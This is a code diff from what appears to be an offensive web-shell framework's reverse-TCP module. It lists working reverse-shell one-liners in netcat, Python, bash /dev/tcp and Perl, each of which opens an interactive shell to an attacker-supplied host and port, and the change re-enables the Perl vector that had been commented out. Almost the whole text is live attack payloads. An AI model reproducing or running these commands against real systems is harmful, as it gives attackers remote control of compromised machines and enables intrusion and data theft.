@@ -93,8 +93,7 @@ class Reversetcp(ModuleGuess):
         self.vectors.add_vector('netcat-bsd','shell.sh',  """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $host $port >/tmp/f""")
         self.vectors.add_vector( 'python','shell.sh', """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'""")
         self.vectors.add_vector('devtcp','shell.sh',  "sleep 1; /bin/bash -c \'$shell 0</dev/tcp/$host/$port 1>&0 2>&0\'")
-                #TODO: Seems broken
-        #self.vectors.add_vector('perl','shell.sh',  """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
+        self.vectors.add_vector('perl','shell.sh',  """perl -e 'use Socket;$i="$host";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
 
     
     def _set_args(self):
